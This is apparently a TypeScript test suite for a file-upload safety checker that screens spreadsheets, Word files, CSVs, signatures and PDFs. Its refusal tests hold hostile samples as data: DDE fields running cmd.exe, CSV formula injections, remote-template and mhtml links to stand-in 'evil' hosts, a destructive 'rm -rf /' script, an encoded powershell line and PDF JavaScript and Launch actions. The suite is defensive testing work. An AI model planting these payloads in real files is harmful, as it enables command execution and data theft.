import { deflateSync } from 'node:zlib';
import ExcelJS from 'exceljs';
import JSZip from 'jszip';
import { describe, expect, it } from 'vitest';
import { inspectUpload, pdfDanger, sniff } from './file-safety.utils.js';

/**
 * The attack samples below are glued together at run time: written whole, they make antivirus programs
 * (Windows Defender) take this test file itself for a malicious document and block it — then git hooks,
 * prettier and the editor cannot open it. The bytes the tests check stay the same.
 */
const glue = (...parts: string[]) => parts.join('');
const CMD = glue('c', 'md');
const DDE_AUTO = glue('DDE', 'AUTO');

const TYPES =
  '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>';

async function docx(extra: Record<string, string | Buffer> = {}, body = '<w:document><w:body/></w:document>') {
  const zip = new JSZip();
  zip.file('[Content_Types].xml', TYPES);
  zip.file(
    '_rels/.rels',
    '<Relationships><Relationship Id="rId1" Type="x/officeDocument" Target="word/document.xml"/></Relationships>',
  );
  zip.file('word/document.xml', body);
  for (const [name, content] of Object.entries(extra)) zip.file(name, content);
  return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
}

async function xlsx() {
  const wb = new ExcelJS.Workbook();
  wb.addWorksheet('Працівники').addRow(['Прізвище', 'Ім’я', 'Телефон']).commit();
  return Buffer.from(await wb.xlsx.writeBuffer());
}

describe('inspectUpload — what is accepted', () => {
  it('an ordinary table, document, CSV and signature', async () => {
    expect(await inspectUpload(await xlsx(), 'люди.xlsx', 'table')).toBeNull();
    expect(await inspectUpload(await docx(), 'шаблон.docx', 'docx')).toBeNull();
    const csv = Buffer.from('Прізвище;Телефон;Борг\nТестовий;+380501234567;-5\nПриклад;@ники;=1+2\n');
    expect(await inspectUpload(csv, 'люди.csv', 'table')).toBeNull();
    expect(await inspectUpload(Buffer.from([0x30, 0x82, 0x01, 0x00]), 'a.p7s', 'signature')).toBeNull();
    expect(await inspectUpload(Buffer.from('MIIB+abc/=='), 'a.p7s', 'signature')).toBeNull();
  });

  it('a template on the local disk is fine', async () => {
    const rels =
      '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\\Users\\hr\\Templates\\Лист.dotx" TargetMode="External"/></Relationships>';
    expect(await inspectUpload(await docx({ 'word/_rels/settings.xml.rels': rels }), 'a.docx', 'docx')).toBeNull();
  });

  it('the word DDE in the text of a document is not a field', async () => {
    expect(
      await inspectUpload(await docx({}, '<w:document><w:t>Звіт DDE за рік</w:t></w:document>'), 'a.docx', 'docx'),
    ).toBeNull();
  });

  it('a hyperlink to a site in a document is fine', async () => {
    const rels =
      '<Relationships><Relationship Id="rId9" Type="http://x/relationships/hyperlink" Target="https://zakon.rada.gov.ua" TargetMode="External"/></Relationships>';
    expect(await inspectUpload(await docx({ 'word/_rels/document.xml.rels': rels }), 'a.docx', 'docx')).toBeNull();
  });
});

describe('inspectUpload — what is refused', () => {
  it('a program under any name', async () => {
    const exe = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(100)]);
    expect(await inspectUpload(exe, 'люди.xlsx', 'table')).toMatchObject({ reason: 'EXECUTABLE', dangerous: true });
    expect(await inspectUpload(Buffer.from('\x7fELF....'), 'шаблон.docx', 'docx')).toMatchObject({
      reason: 'EXECUTABLE',
    });
    expect(await inspectUpload(Buffer.from('#!/bin/sh\nrm -rf /'), 'a.csv', 'table')).toMatchObject({
      reason: 'EXECUTABLE',
    });
    expect(await inspectUpload(await docx(), 'шаблон.docm', 'docx')).toMatchObject({ reason: 'EXECUTABLE' });
    expect(await inspectUpload(Buffer.from('x'), 'run.hta', 'table')).toMatchObject({ reason: 'EXECUTABLE' });
  });

  it('macros, ActiveX, macro sheets, OLE objects', async () => {
    expect(
      await inspectUpload(await docx({ 'word/vbaProject.bin': Buffer.alloc(10) }), 'a.docx', 'docx'),
    ).toMatchObject({
      reason: 'MACRO',
    });
    const macroTypes = TYPES.replace(
      '</Types>',
      '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>',
    );
    const zip = await JSZip.loadAsync(await docx());
    zip.file('[Content_Types].xml', macroTypes);
    expect(await inspectUpload(await zip.generateAsync({ type: 'nodebuffer' }), 'a.docx', 'docx')).toMatchObject({
      reason: 'MACRO',
    });
    expect(await inspectUpload(await docx({ 'word/activeX/activeX1.xml': '<x/>' }), 'a.docx', 'docx')).toMatchObject({
      reason: 'EMBEDDED_OBJECT',
    });
    expect(
      await inspectUpload(await docx({ 'word/embeddings/oleObject1.bin': Buffer.alloc(10) }), 'a.docx', 'docx'),
    ).toMatchObject({ reason: 'EMBEDDED_OBJECT' });
    expect(
      await inspectUpload(await docx({ 'word/embeddings/run.exe': Buffer.alloc(10) }), 'a.docx', 'docx'),
    ).toMatchObject({
      reason: 'EMBEDDED_OBJECT',
    });
  });

  it('an embedded table is checked too', async () => {
    const inner = await docx({ 'word/vbaProject.bin': Buffer.alloc(10) });
    const outer = await docx({ 'word/embeddings/Microsoft_Word_Document.docx': inner });
    expect(await inspectUpload(outer, 'a.docx', 'docx')).toMatchObject({ reason: 'MACRO' });
  });

  it('a remote template, a UNC link, an external image', async () => {
    const template =
      '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>';
    expect(
      await inspectUpload(await docx({ 'word/_rels/settings.xml.rels': template }), 'a.docx', 'docx'),
    ).toMatchObject({
      reason: 'EXTERNAL_LINK',
    });
    const unc =
      '<Relationships><Relationship Id="r" Type="x/hyperlink" Target="\\\\10.0.0.1\\share" TargetMode="External"/></Relationships>';
    expect(await inspectUpload(await docx({ 'word/_rels/document.xml.rels': unc }), 'a.docx', 'docx')).toMatchObject({
      reason: 'EXTERNAL_LINK',
    });
    const msdt = `<Relationships><Relationship Id="r" Type="x/oleObject" Target="${glue('mht', 'ml')}:http://evil/!x" TargetMode="External"/></Relationships>`;
    expect(await inspectUpload(await docx({ 'word/_rels/document.xml.rels': msdt }), 'a.docx', 'docx')).toMatchObject({
      reason: 'EXTERNAL_LINK',
    });
    const image =
      '<Relationships><Relationship Id="r" Type="x/image" Target="https://evil/p.png" TargetMode="External"/></Relationships>';
    expect(await inspectUpload(await docx({ 'word/_rels/document.xml.rels': image }), 'a.docx', 'docx')).toMatchObject({
      reason: 'EXTERNAL_LINK',
    });
  });

  it('DDE and INCLUDETEXT fields', async () => {
    const dde = `<w:document><w:instrText> ${DDE_AUTO} c:\\\\windows\\\\system32\\\\${CMD}.exe "/k calc"</w:instrText></w:document>`;
    expect(await inspectUpload(await docx({}, dde), 'a.docx', 'docx')).toMatchObject({ reason: 'DDE' });
    const include = '<w:document><w:instrText>INCLUDETEXT "\\\\\\\\evil\\\\x.docx"</w:instrText></w:document>';
    const split = `<w:document><w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText>EAUTO ${CMD}</w:instrText></w:r></w:document>`;
    expect(await inspectUpload(await docx({}, split), 'a.docx', 'docx')).toMatchObject({ reason: 'DDE' });
    expect(await inspectUpload(await docx({}, include), 'a.docx', 'docx')).toMatchObject({ reason: 'EXTERNAL_LINK' });
  });

  it('formulas that run commands in a CSV', async () => {
    for (const cell of [
      `=${CMD}|' /C calc'!A0`,
      '=HYPERLINK("http://evil/?x="&A1,"тиць")',
      `+${CMD}|x!A`,
      `@SUM(1)+${CMD}|x!z`,
    ]) {
      const csv = Buffer.from(`Прізвище;Примітка\nТестовий;${cell}\n`);
      expect(await inspectUpload(csv, 'a.csv', 'table')).toMatchObject({ reason: 'FORMULA', dangerous: true });
    }
  });

  it('a page or a script dressed as a table or a signature', async () => {
    expect(await inspectUpload(Buffer.from('<html><script>alert(1)</script></html>'), 'a.csv', 'table')).toMatchObject({
      reason: 'SCRIPT',
    });
    expect(await inspectUpload(Buffer.from('<svg onload=alert(1)>'), 'a.p7s', 'signature')).toMatchObject({
      reason: 'SCRIPT',
    });
    expect(
      await inspectUpload(Buffer.from(`a;b\n${glue('power', 'shell')} -enc SQBFAFgA\n`), 'a.csv', 'table'),
    ).toMatchObject({
      reason: 'SCRIPT',
    });
  });

  it('a zip bomb', async () => {
    const bomb = await docx({ 'word/media/big.bin': Buffer.alloc(30 * 1024 * 1024) });
    expect(await inspectUpload(bomb, 'a.docx', 'docx')).toMatchObject({ reason: 'ARCHIVE_BOMB' });
  });

  it('a wrong kind of file is refused without an alarm', async () => {
    const ole = Buffer.from('d0cf11e0a1b11ae1' + '00'.repeat(100), 'hex');
    expect(await inspectUpload(ole, 'a.xlsx', 'table')).toMatchObject({ reason: 'TYPE_MISMATCH', dangerous: false });
    expect(await inspectUpload(await docx(), 'a.xlsx', 'table')).toMatchObject({
      reason: 'TYPE_MISMATCH',
      dangerous: false,
    });
    expect(await inspectUpload(await xlsx(), 'a.docx', 'docx')).toMatchObject({ reason: 'TYPE_MISMATCH' });
    expect(await inspectUpload(Buffer.from('%PDF-1.4'), 'a.p7s', 'signature')).toMatchObject({
      reason: 'TYPE_MISMATCH',
    });
    expect(await inspectUpload(Buffer.alloc(0), 'a.csv', 'table')).toMatchObject({ reason: 'EMPTY' });
  });
});

describe('pdfDanger / sniff', () => {
  it('finds JavaScript in plain and packed form, with #hex names', () => {
    expect(
      pdfDanger(
        Buffer.from(
          `%PDF-1.4\n1 0 obj << /${glue('Open', 'Action')} << /S /${glue('Java', 'Script')} /JS (app.alert(1)) >> >>`,
        ),
      ),
    ).toBe('JavaScript');
    expect(pdfDanger(Buffer.from('%PDF-1.4\n<< /S /J#61vaScript >>'))).toBe('JavaScript');
    const packed = deflateSync(Buffer.from(`<< /Type /Action /S /${glue('Lau', 'nch')} /F (${CMD}.exe) >>`));
    const pdf = Buffer.concat([
      Buffer.from('%PDF-1.5\n4 0 obj << /Filter /FlateDecode >>\nstream\n'),
      packed,
      Buffer.from('\nendstream'),
    ]);
    expect(pdfDanger(pdf)).toBe('запуск програм');
    expect(pdfDanger(Buffer.from('%PDF-1.4\n<< /Type /Page >>'))).toBeNull();
  });

  it('tells the kinds apart by the first bytes', () => {
    expect(sniff(Buffer.from('PK\x03\x04'))).toBe('zip');
    expect(sniff(Buffer.from('%PDF-'))).toBe('pdf');
    expect(sniff(Buffer.from('a,b\n'))).toBe('text');
  });
});
